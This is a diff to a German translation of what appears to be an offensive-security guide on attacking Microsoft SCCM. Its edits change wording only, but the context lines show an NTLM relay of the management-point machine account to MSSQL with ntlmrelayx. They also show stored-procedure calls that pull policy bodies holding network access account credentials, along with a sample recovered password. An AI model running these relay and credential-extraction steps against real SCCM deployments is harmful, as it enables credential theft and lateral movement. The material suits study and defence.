@@ -35,7 +35,7 @@ curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint -
 ```
 ---
 
-## 2. Übertragen Sie das MP-Maschinenkonto an MSSQL
+## 2. Leiten Sie das MP-Maschinenkonto an MSSQL weiter
 ```bash
 # 1. Start the relay listener (SMB→TDS)
 ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
@@ -71,7 +71,7 @@ EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N''
 ```
 Jede Zeile enthält `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.
 
-Fokus auf Richtlinien:
+Fokussieren Sie sich auf Richtlinien:
 * **NAAConfig**  – Netzwerkzugangskonto-Credentials
 * **TS_Sequence** – Tasksequenzvariablen (OSDJoinAccount/Password)
 * **CollectionSettings** – Kann Run-as-Konten enthalten
@@ -102,15 +102,15 @@ NetworkAccessPassword: P4ssw0rd123
 ```
 ---
 
-## 5. Relevante SQL-Rollen & -verfahren
+## 5. Relevante SQL-Rollen & Verfahren
 Beim Relay wird der Login zugeordnet zu:
 * `smsdbrole_MP`
 * `smsdbrole_MPUserSvc`
 
 Diese Rollen bieten Dutzende von EXEC-Berechtigungen, die wichtigsten, die in diesem Angriff verwendet werden, sind:
 
-| Gespeicherte Prozedur | Zweck |
-|-----------------------|-------|
+| Stored Procedure | Zweck |
+|------------------|---------|
 | `MP_GetMachinePolicyAssignments` | Listet die auf ein `clientID` angewendeten Richtlinien auf. |
 | `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Gibt den vollständigen Richtlinieninhalt zurück. |
 | `MP_GetListOfMPsInSiteOSD` | Wird durch den `MPKEYINFORMATIONMEDIA`-Pfad zurückgegeben. |
